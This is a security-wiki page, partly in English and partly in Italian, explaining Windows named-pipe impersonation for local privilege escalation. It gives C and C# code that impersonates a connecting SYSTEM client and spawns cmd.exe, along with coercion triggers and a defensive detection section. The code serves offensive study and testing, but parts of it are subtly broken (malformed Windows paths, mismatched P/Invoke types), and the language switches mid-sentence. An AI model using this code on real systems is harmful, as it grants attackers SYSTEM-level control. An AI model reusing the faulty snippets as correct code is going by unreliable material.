# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation is a local privilege escalation primitive that lets a named-pipe server thread adopt the security context of a client that connects to it. In practice, an attacker who can run code with SeImpersonatePrivilege can coerce a privileged client (e.g., a SYSTEM service) to connect to an attacker-controlled pipe, call ImpersonateNamedPipeClient, duplicate the resulting token into a primary token, and spawn a process as the client (often NT AUTHORITY\SYSTEM).

Questa pagina si concentra sulla tecnica principale. Per catene di exploit end-to-end che costringono SYSTEM a connettersi alla vostra pipe, vedere le Potato family pages referenziate più sotto.

## TL;DR
- Create a named pipe: \\.\pipe\<random> e attendere una connessione.
- Far connettere a essa un componente privilegiato (spooler/DCOM/EFSRPC/etc.).
- Read at least one message from the pipe, quindi chiamare ImpersonateNamedPipeClient.
- Open the impersonation token from the current thread, DuplicateTokenEx(TokenPrimary), e usare CreateProcessWithTokenW/CreateProcessAsUser per ottenere un processo SYSTEM.

## Requirements and key APIs
- Privileges typically needed by the calling process/thread:
  - SeImpersonatePrivilege per impersonare con successo un client che si connette e per usare CreateProcessWithTokenW.
  - In alternativa, dopo aver impersonato SYSTEM, è possibile usare CreateProcessAsUser, che può richiedere SeAssignPrimaryTokenPrivilege e SeIncreaseQuotaPrivilege (questi vengono soddisfatti quando si sta impersonando SYSTEM).
- Core APIs used:
  - CreateNamedPipe / ConnectNamedPipe
  - ReadFile/WriteFile (è necessario leggere almeno un messaggio prima dell'impersonation)
  - ImpersonateNamedPipeClient e RevertToSelf
  - OpenThreadToken, DuplicateTokenEx(TokenPrimary)
  - CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: per eseguire azioni utili localmente, il client deve consentire SecurityImpersonation (default per molti client RPC/named-pipe locali). I client possono abbassare questo livello con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION quando aprono la pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- Se ImpersonateNamedPipeClient restituisce ERROR_CANNOT_IMPERSONATE (1368), assicurati di leggere dalla pipe prima e che il client non abbia limitato l'impersonation al livello Identification.
- Preferire DuplicateTokenEx con SecurityImpersonation e TokenPrimary per creare un primary token adatto alla creazione di processi.

## Esempio rapido .NET
In .NET, NamedPipeServerStream può impersonare tramite RunAsClient. Una volta in impersonation, duplica il thread token e crea un processo.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Trigger/coercizioni comuni per portare SYSTEM alla tua pipe
Queste tecniche costringono servizi privilegiati a connettersi alla tua named pipe in modo da poterli impersonare:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Risoluzione dei problemi e insidie
- Devi leggere almeno un messaggio dalla pipe prima di chiamare ImpersonateNamedPipeClient; altrimenti otterrai ERROR_CANNOT_IMPERSONATE (1368).
- Se il client si connette con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, il server non può impersonare completamente; controlla il livello di impersonazione del token tramite GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW richiede SeImpersonatePrivilege sul chiamante. Se ciò fallisce con ERROR_PRIVILEGE_NOT_HELD (1314), usa CreateProcessAsUser dopo che hai già impersonato SYSTEM.
- Assicurati che lo security descriptor della tua pipe permetta al servizio target di connettersi se lo hai indurito; per default, le pipe sotto \\.\pipe sono accessibili secondo la DACL del server.

## Rilevamento e hardening
- Monitora la creazione e le connessioni delle named pipe. Sysmon Event IDs 17 (Pipe Created) e 18 (Pipe Connected) sono utili per stabilire una baseline dei nomi di pipe legittimi e intercettare pipe insolite o dall'aspetto casuale che precedono eventi di manipolazione del token.
- Cerca sequenze: un processo crea una pipe, un servizio SYSTEM si connette, poi il processo creatore avvia un processo figlio come SYSTEM.
- Riduci l'esposizione rimuovendo SeImpersonatePrivilege dagli account di servizio non essenziali e evitando logon di servizio non necessari con privilegi elevati.
- Sviluppo difensivo: quando ti connetti a named pipe non attendibili, specifica SECURITY_SQOS_PRESENT con SECURITY_IDENTIFICATION per impedire ai server di impersonare completamente il client se non necessario.

## Riferimenti
- Windows: ImpersonateNamedPipeClient documentation (requisiti e comportamento dell'impersonazione). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (guida passo-passo ed esempi di codice). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
